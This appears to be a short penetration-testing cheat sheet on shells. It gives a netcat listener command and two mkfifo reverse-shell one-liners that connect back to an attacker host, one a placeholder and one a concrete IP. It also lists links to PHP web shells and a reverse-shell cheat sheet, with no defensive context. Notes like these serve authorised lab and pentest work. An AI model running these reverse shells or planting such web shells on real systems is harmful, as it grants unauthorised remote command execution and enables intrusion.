# Shells Overview

## Reverse shells

{% code overflow="wrap" %}
```bash
nc -lvnp 443     # Set up a netcat listener on port 443 on the attack machine

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.10.220.202 443>/tmp/f
```
{% endcode %}

web shells:&#x20;

{% code overflow="wrap" %}
```bash
https://www.r57shell.net/index.php

https://github.com/flozz/p0wny-shell #A minimalistic single-file PHP web shell that allows remote command execution

https://github.com/b374k/b374k # A more feature-rich PHP web shell with file management and command execution, among other functionalities.

https://www.r57shell.net/single.php?id=13 # A well-known and robust PHP web shell with extensive functionality.

```
{% endcode %}

[https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
